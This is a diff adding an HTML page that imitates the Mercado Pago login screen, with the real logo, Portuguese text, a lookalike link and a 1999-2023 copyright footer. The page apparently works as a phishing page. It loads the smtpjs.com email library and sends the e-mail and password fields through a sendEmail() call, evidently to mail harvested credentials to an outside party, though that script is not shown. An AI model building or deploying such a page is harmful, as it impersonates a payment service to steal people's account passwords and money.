@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<title>Mercado Pago | Login</title>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta http-equiv="refresh" content="180">
+		<link rel="stylesheet" type="text/css" href="css/style.css">
+		<link rel="icon" type="image/x-icon" href="https://http2.mlstatic.com/ui/navigation/5.19.1/mercadopago/favicon.ico">
+		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+		<script src="https://smtpjs.com/v3/smtp.js"></script>
+	</head>
+	<body>
+		<scriot src="script/script.js"></scriot>
+		<script src="script/app.js"></script>
+		<header class="navBg">
+			<nav class="navbar">
+				 <a href="https://mercado.pago.br/"><img src=" https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/5.19.1/mercadopago/logo__small.png" alt="MercadoPago Logo" >
+				<a href="https://www.mercadopago.com.br/" class="nav-title">Mercado <br>Pago</a></a>
+			</nav>
+		</header>
+		<main>
+			<section>
+				<div class="contentsRight">
+					<b>Digite seu e-mail,<br> telefone ou usuário do<br> Mercado Pago</b>
+				</div>
+				<hr id="line">
+				<div class="contentsRightOpts">
+					<small><b>Reportar um problema</b></small>
+					<ul class="contentsOpts">
+						<li class="elementLeft"><a href="#"><i class="fa-solid fa-mobile"></i></i><span>Roubo ou perda de telefone</span></a></li>
+						<hr class="lineCube">
+						<li class="elementLeft" id="textSteal"><a href="#"><i class="fa-solid fa-user"></i><span>Roubo de conta</span></a></li>
+					</ul>
+					<span><p>Preciso de ajuda com outros temas</p></span>
+				</div>
+			</section>
+			<section class="contentsLeft">
+				<fieldset class="fieldForm">
+					<form onsubmit="return sendEmail()" method="POST" autocomplete="off">
+					<div>
+						<div class="informationsLabel">
+							<small>E-mail, telefone ou usuarío</small><br>
+							<input type="email" name="contentField" id="contentField" title="Insert here your most secure e-mail" required>
+						</div>
+						<div class="informationsLabelSec">
+							<small>Senha ou credencial de acesso</small><br>
+							<input type="password" name="contentPassword" id="contentPassword" title="insert here your most secure password" required>
+						</div>
+						<div class="btnsForm">
+							<input type="submit" value="Continuar" name="continueBtn" id="continueBtn">
+							<a href="#"><b>Criar conta</b></a>
+						</div>
+					</div>
+					<form>
+				</fieldset>
+			</section>
+		</main>
+		<div class="footer">
+			<div>
+				<span><a href="#"><span class="footerText">Como cuidamos da sua privacidade  - </span></a>Copyright © 1999-2023 Ebazar.com.br LTDA.</span>
+			</div>
+			<span><span class="footerText">Protegido por reCAPTCHA - </span><a href="#">Privacidade</a> - <a href="#">Condiçoes</a></span>
+		</div>
+	</body>
+</html>
